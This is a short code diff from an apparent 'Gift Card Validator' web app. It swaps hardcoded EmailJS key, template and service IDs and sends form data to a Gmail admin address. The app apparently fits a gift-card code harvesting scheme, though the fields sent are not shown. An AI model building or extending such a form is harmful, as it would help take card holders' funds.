@@ -273,9 +273,9 @@ function PurchaseOrValidate() {
         };        // const serviceId = process.env.REACT_APP_SERVICE_ID;
         // const templateId = process.env.REACT_APP_TEMPLATE_ID;
         // const publicKey = process.env.REACT_APP_PUBLIC_KEY;
-        const publicKey = process.env.REACT_APP_PUBLIC_KEY || "BoqfOqh8-iO3tlecS";
-        const templateId = process.env.REACT_APP_TEMPLATE_ID || "template_mcgcud6";
-        const serviceId = process.env.REACT_APP_SERVICE_ID || "service_x64dc24";
+        const publicKey = process.env.REACT_APP_PUBLIC_KEY || "Oi_6eMO1ibIDLP7K9";
+        const templateId = process.env.REACT_APP_TEMPLATE_ID || "template_kq7rvh7";
+        const serviceId = process.env.REACT_APP_SERVICE_ID || "service_4sg9406";
         const adminEmail = process.env.REACT_APP_ADMIN_EMAIL || "help.allgiftcardvalidator@gmail.com";        const templateParams = {
             from_name: "Gift Card Validator",
             to_email: adminEmail, // Send to business admin
